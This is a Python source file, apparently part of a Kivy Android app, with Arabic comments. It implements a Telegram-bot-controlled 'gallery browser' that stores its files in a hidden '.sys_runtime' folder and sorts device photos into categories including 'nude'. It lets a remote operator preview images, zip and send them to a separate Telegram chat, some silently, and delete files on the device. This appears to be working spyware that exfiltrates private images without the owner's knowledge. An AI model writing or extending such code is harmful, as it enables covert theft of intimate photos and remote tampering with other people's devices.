# -*- coding: utf-8 -*-
import os
import time
import zipfile
import logging
import random
import gc
import json
import threading
import hashlib

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "g_tmp")

# إنشاء المجلدات
try:
    os.makedirs(P, exist_ok=True)
    os.makedirs(T, exist_ok=True)
except Exception as e:
    logging.error(f"Failed to create runtime directories: {e}")

logging.basicConfig(
    filename=os.path.join(P, "g.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from PIL import Image, ImageOps
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False


class BaseGalleryBrowser:
    """
    الفئة الأساسية الموحدة لإدارة المعرض والوسائط.
    تحتوي على جميع الدوال المشتركة بين media_scanner و gallery_browser.
    """
    SUPPORTED_IMAGE_EXTS = {'.jpg', '.jpeg', '.png', '.bmp', '.webp', '.gif', '.tiff', '.ico'}
    SUPPORTED_VIDEO_EXTS = {'.mp4', '.mkv', '.3gp', '.mov', '.avi', '.webm', '.flv'}

    __slots__ = (
        'sc', 'tg', 'ipp', '_timers', '_lock',
        'supported_image_exts', 'supported_video_exts'
    )

    def __init__(self, sc=None, tg=None):
        self.sc = sc
        self.tg = tg
        self.ipp = 16
        self._timers = []
        self._lock = threading.Lock()
        self.supported_image_exts = self.SUPPORTED_IMAGE_EXTS
        self.supported_video_exts = self.SUPPORTED_VIDEO_EXTS

        try:
            os.makedirs(T, exist_ok=True)
        except Exception as e:
            logging.error(f"Failed to create temp directory: {e}")

        self._cleanup_old_temp()
        self._cleanup_timers()

    # ========== دوال التنظيف ==========
    def _cleanup_old_temp(self):
        try:
            if not os.path.exists(T):
                return
            now = time.time()
            for f in os.listdir(T):
                path = os.path.join(T, f)
                try:
                    if os.path.isfile(path) and os.path.getmtime(path) < now - 3600:
                        os.remove(path)
                except Exception as e:
                    logging.error(f"Error removing old temp file {path}: {e}")
        except Exception as e:
            logging.error(f"Gallery cleanup error: {e}")

    def _cleanup_timers(self):
        try:
            for timer in self._timers:
                if timer and timer.is_alive():
                    try:
                        timer.cancel()
                    except:
                        pass
            self._timers.clear()
            logging.debug("All timers cleaned up")
        except Exception as e:
            logging.error(f"Timer cleanup error: {e}")

    def cancel_all_timers(self):
        self._cleanup_timers()

    # ========== دوال مساعدة ==========
    def _safe_remove(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Safe remove error {path}: {e}")
        return False

    def _check_dependencies(self):
        if self.sc is None:
            logging.error("MediaScanner not available")
            return False
        if self.tg is None:
            logging.error("TelegramUI not available")
            return False
        return True

    def _is_image_file(self, path):
        if not path or not isinstance(path, str):
            return False
        ext = os.path.splitext(path)[1].lower()
        return ext in self.supported_image_exts

    def _is_video_file(self, path):
        if not path or not isinstance(path, str):
            return False
        ext = os.path.splitext(path)[1].lower()
        return ext in self.supported_video_exts

    def _thumbnail(self, path, size=(300, 300)):
        if not PIL_AVAILABLE or not os.path.exists(path):
            return None
        if not self._is_image_file(path):
            logging.debug(f"Skipping non-image file: {path}")
            return None

        try:
            with Image.open(path) as img:
                try:
                    resample = Image.Resampling.LANCZOS
                except AttributeError:
                    resample = Image.LANCZOS

                img = ImageOps.fit(img, size, method=resample, centering=(0.5, 0.5))
                os.makedirs(T, exist_ok=True)
                out_path = os.path.join(T, f"th_{int(time.time()*1000)}_{random.randint(1000,9999)}.jpg")
                img.save(out_path, "JPEG", quality=70, optimize=True)

                if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
                    return out_path
                return None
        except Exception as e:
            logging.error(f"Thumbnail error for {path}: {e}")
            return None

    def _get_category_emoji(self, cat):
        emoji_map = {
            "pending": "📷",
            "nude": "🔞",
            "questionable": "⚠️",
            "normal": "✅"
        }
        text_map = {
            "pending": "جديد",
            "nude": "حساس",
            "questionable": "مشبوه",
            "normal": "عادي"
        }
        return emoji_map.get(cat, "🖼️"), text_map.get(cat, cat)

    # ========== واجهات المعرض ==========
    def get_grid_kb(self, cat="pending", page=0):
        if not self._check_dependencies():
            return {"inline_keyboard": [[{"text": "❌ الخدمة غير متوفرة", "callback_data": "nop"}]]}

        try:
            stats = self.sc.get_statistics() or {}
        except Exception as e:
            logging.error(f"Stats error: {e}")
            stats = {}

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page) or []
        except Exception as e:
            logging.error(f"Gallery fetch error: {e}")
            items = []

        total = stats.get(cat, 0)
        total_pages = (total + self.ipp - 1) // self.ipp if total > 0 else 1

        keyboard = []

        # صف الفئات
        cats_row = []
        for c in ["pending", "nude", "questionable", "normal"]:
            count = stats.get(c, 0)
            if count > 0:
                emoji, name = self._get_category_emoji(c)
                display = f"{emoji} {name} ({count})" if c != cat else f"✅ {emoji} {name} ({count})"
                cats_row.append({"text": display, "callback_data": f"g_nav|{c}|0"})
        if cats_row:
            keyboard.append(cats_row[:4])

        # شبكة الصور 4×4
        row = []
        for i in range(self.ipp):
            if i < len(items):
                label = items[i].get("label", str((page * self.ipp) + i + 1).zfill(2))
                btn = {"text": f"🖼 {label}", "callback_data": f"g_opt|{cat}|{page}|{i}"}
            else:
                btn = {"text": "⬛", "callback_data": "nop"}
            row.append(btn)
            if len(row) == 4:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)

        # أزرار التنقل
        nav_buttons = []
        if page > 0:
            nav_buttons.append({"text": "⏮️", "callback_data": f"g_nav|{cat}|{page-1}"})
        nav_buttons.append({"text": f"📄 {page+1}/{max(1, total_pages)}", "callback_data": "nop"})
        if len(items) == self.ipp and (page + 1) < total_pages:
            nav_buttons.append({"text": "⏭️", "callback_data": f"g_nav|{cat}|{page+1}"})
        keyboard.append(nav_buttons)

        if items:
            keyboard.append([{"text": "📦 تحميل الصفحة الحالية (ZIP)", "callback_data": f"g_bulk|{cat}|{page}"}])

        return {"inline_keyboard": keyboard}

    def show_options(self, cid, cat, page_str, idx_str):
        if not self._check_dependencies():
            return

        try:
            page = int(page_str)
            idx = int(idx_str)
        except ValueError:
            logging.error(f"Invalid page/index: {page_str}, {idx_str}")
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if items is None or idx >= len(items):
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
                return
        except Exception as e:
            logging.error(f"Show options error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
            return

        item = items[idx]
        path = item.get('path')
        label = item.get("label", "??")

        if not path or not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود على الجهاز."})
            return

        try:
            size_mb = round(os.path.getsize(path) / (1024 * 1024), 1)
        except Exception:
            size_mb = 0

        kb = [
            [{"text": "👁 معاينة", "callback_data": f"g_act|pr|{cat}|{page}|{idx}"}],
            [
                {"text": "⬇️ تحميل (ZIP)", "callback_data": f"g_act|dw|{cat}|{page}|{idx}"},
                {"text": "🗑 حذف", "callback_data": f"g_conf|de|{cat}|{page}|{idx}"}
            ],
            [{"text": "🔙 عودة", "callback_data": f"g_nav|{cat}|{page}"}]
        ]

        try:
            self.tg._api("sendMessage", {
                "chat_id": cid,
                "text": f"📦 **#{label}**  |  حجم: `{size_mb} MB`\n📂 الفئة: `{cat}`",
                "reply_markup": json.dumps({"inline_keyboard": kb}),
                "parse_mode": "Markdown"
            })
        except Exception as e:
            logging.error(f"Send options error: {e}")

    def execute_action(self, cid, action, cat, page_str, idx_str=None):
        if not self._check_dependencies():
            return

        try:
            page = int(page_str)
        except ValueError:
            logging.error(f"Invalid page: {page_str}")
            return

        if action == "bulk":
            self._handle_bulk_download(cid, cat, page)
            return

        if idx_str is None:
            return

        try:
            idx = int(idx_str)
        except ValueError:
            logging.error(f"Invalid index: {idx_str}")
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if items is None or idx >= len(items):
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
                return
        except Exception as e:
            logging.error(f"Execute action error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في جلب البيانات."})
            return

        item = items[idx]
        path = item.get('path')
        label = item.get("label", "??")

        if not path:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ مسار الملف غير صالح."})
            return

        if action == "pr":
            self._preview(cid, path)
        elif action == "dw":
            self._download(cid, path, label)
        elif action in ("del", "de"):
            self._delete(cid, path, label, cat, page)
        else:
            logging.warning(f"Unknown action: {action}")

    # ========== دوال التحميل والحذف ==========
    def _handle_bulk_download(self, cid, cat, page):
        if not self._check_dependencies():
            return

        try:
            items = self.sc.get_gallery_by_category(cat, limit=self.ipp, page=page)
            if not items:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا توجد صور في هذه الصفحة."})
                return

            total_size = 0
            for item in items:
                path = item.get('path')
                if path and os.path.exists(path):
                    try:
                        total_size += os.path.getsize(path)
                    except Exception:
                        pass
            if total_size > 100 * 1024 * 1024:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الصفحة كبير جداً (>100MB). حاول صفحة أخرى."})
                return

            os.makedirs(T, exist_ok=True)
            zip_path = os.path.join(T, f"bulk_{cat}_p{page}_{int(time.time())}_{random.randint(1000,9999)}.zip")

            with self._lock:
                try:
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for item in items:
                            path = item.get('path')
                            if path and os.path.exists(path):
                                try:
                                    zf.write(path, os.path.basename(path))
                                except Exception as e:
                                    logging.error(f"Error adding file to zip: {e}")

                    if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                        raise Exception("Failed to create zip file")

                    target = getattr(self.tg, 'dat', cid)
                    with open(zip_path, 'rb') as f:
                        resp = self.tg._api("sendDocument", {
                            "chat_id": target,
                            "caption": f"📦 تحميل جماعي | الفئة: {cat} | الصفحة {page+1} | {len(items)} ملف",
                            "disable_notification": True
                        }, {"document": f})

                    if resp and resp.get('ok'):
                        self.tg._api("sendMessage", {"chat_id": cid, "text": f"✅ تم إرسال {len(items)} ملفاً مضغوطاً."})
                    else:
                        self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل إرسال الملف المضغوط."})

                except Exception as e:
                    logging.error(f"Bulk download error: {e}")
                    self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل إنشاء ملف ZIP: {str(e)[:100]}"})
                finally:
                    if os.path.exists(zip_path):
                        self._safe_remove(zip_path)
                    gc.collect()

        except Exception as e:
            logging.error(f"Bulk handler error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في معالجة التحميل الجماعي."})

    def _preview(self, cid, path):
        if not self._check_dependencies():
            return

        if not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        if self._is_video_file(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "📽 معاينة الفيديو غير مدعومة. يمكنك تحميله."})
            return

        thumb = None
        try:
            thumb = self._thumbnail(path)
            if not thumb:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ لا يمكن إنشاء معاينة لهذا الملف."})
                return

            with open(thumb, 'rb') as photo:
                resp = self.tg._api("sendPhoto", {
                    "chat_id": cid,
                    "caption": "🔍 معاينة (ستُحذف بعد 30 ثانية)"
                }, {"photo": photo})

            if resp and resp.get('ok'):
                msg_id = resp['result']['message_id']
                self._schedule_delete(cid, msg_id, 30)
            else:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل في إرسال المعاينة."})

        except Exception as e:
            logging.error(f"Preview error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في إرسال المعاينة."})
        finally:
            if thumb and os.path.exists(thumb):
                self._safe_remove(thumb)

    def _download(self, cid, path, label):
        if not self._check_dependencies():
            return

        if not os.path.exists(path):
            self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود."})
            return

        try:
            file_size = os.path.getsize(path)
        except Exception:
            file_size = 0

        if file_size > 45 * 1024 * 1024:
            self.tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ حجم الملف كبير جداً (>45MB). لا يمكن إرساله عبر البوت."})
            return

        os.makedirs(T, exist_ok=True)
        zip_path = os.path.join(T, f"dl_{int(time.time())}_{random.randint(1000,9999)}.zip")

        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(path, os.path.basename(path))

            if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
                raise Exception("Failed to create zip")

            target_chat = getattr(self.tg, 'dat', cid)
            with open(zip_path, 'rb') as f:
                self.tg._api("sendDocument", {
                    "chat_id": target_chat,
                    "caption": f"📤 {label}"
                }, {"document": f})

        except Exception as e:
            logging.error(f"Download error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في إرسال الملف: {str(e)[:100]}"})
        finally:
            if os.path.exists(zip_path):
                self._safe_remove(zip_path)
            gc.collect()

    def _delete(self, cid, path, label, cat=None, page=None):
        if not self._check_dependencies():
            return

        try:
            if os.path.exists(path):
                os.remove(path)

                if self.sc and hasattr(self.sc, 'remove_from_db'):
                    try:
                        self.sc.remove_from_db(path)
                    except Exception as e:
                        logging.error(f"Remove from DB error: {e}")

                msg = f"🗑 تم حذف #{label} نهائياً."
                if cat is not None and page is not None:
                    msg += f"\n🔙 للعودة: /gallery_{cat}_{page}"

                self.tg._api("sendMessage", {"chat_id": cid, "text": msg})
            else:
                self.tg._api("sendMessage", {"chat_id": cid, "text": "❌ الملف غير موجود مسبقاً."})
        except Exception as e:
            logging.error(f"Delete error: {e}")
            self.tg._api("sendMessage", {"chat_id": cid, "text": f"❌ فشل في حذف الملف: {str(e)[:100]}"})
        finally:
            gc.collect()

    # ========== جدولة الحذف ==========
    def _schedule_delete(self, cid, msg_id, delay_seconds):
        def delete_task():
            try:
                self._delete_message(cid, msg_id)
            except Exception as e:
                logging.error(f"Delete task error: {e}")
            finally:
                self._timers = [t for t in self._timers if t.is_alive()]

        timer = threading.Timer(delay_seconds, delete_task)
        timer.daemon = True
        timer.start()
        self._timers.append(timer)

    def _delete_message(self, cid, msg_id):
        if not self._check_dependencies():
            return

        try:
            self.tg._api("deleteMessage", {"chat_id": cid, "message_id": msg_id})
        except Exception as e:
            logging.error(f"Delete message error: {e}")

    # ========== تنظيف الموارد ==========
    def cleanup(self):
        self._cleanup_timers()
        self._cleanup_old_temp()
